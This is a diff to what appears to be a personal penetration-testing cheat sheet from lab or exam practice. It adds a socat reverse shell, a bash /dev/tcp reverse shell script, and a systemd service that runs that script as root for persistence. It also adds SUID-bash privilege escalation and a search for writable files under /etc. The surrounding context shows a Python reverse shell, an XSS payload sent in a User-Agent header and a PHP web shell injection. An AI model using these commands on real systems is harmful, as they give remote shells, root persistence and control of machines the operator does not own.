@@ -173,6 +173,39 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchmod 4777 /tmp/0xdf' > full-che
 echo "chmod +s /bin/bash" > /tmp/root.sh
 /bin/bash -p
 
+# socat??
+socat TCP:192.168.118.8:18000 EXEC:sh
+
+# when we can't use vi or mousepad(very useful)
+cat << EOF > /home/cmeeks/reverse.sh
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.45.202/80 0>&1
+EOF
+
+# When we need to edit file with terminal
+cat << EOF > /etc/systemd/system/pythonapp.service
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/home/cmeeks/reverse.sh
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+++++++++++++++++ ruby reverse shell ++++++++++++++++++++++++++++++++++++++++++++
+echo 'system("chmod +s /bin/bash")' > app.rb
+
+
+
 ++++++++++++++++ Python reverse shell ++++++++++++++++++++++++++++++++++++++++++++
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -1188,6 +1221,9 @@ curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Ty
 # User-agent
 curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+
+# json format
+| jq .
 ```
 
 ### wget
@@ -2849,6 +2885,9 @@ cat /home/user/.bash_history
 
 # doas(same as sudo) -> check this blog(https://0xdf.gitlab.io/2023/06/10/htb-soccer.html)
 find / -name doas.conf 2>/dev/null
+
+# wriable config file
+find /etc -type f -writable 2> /dev/null
 
 # Important directories
 /var
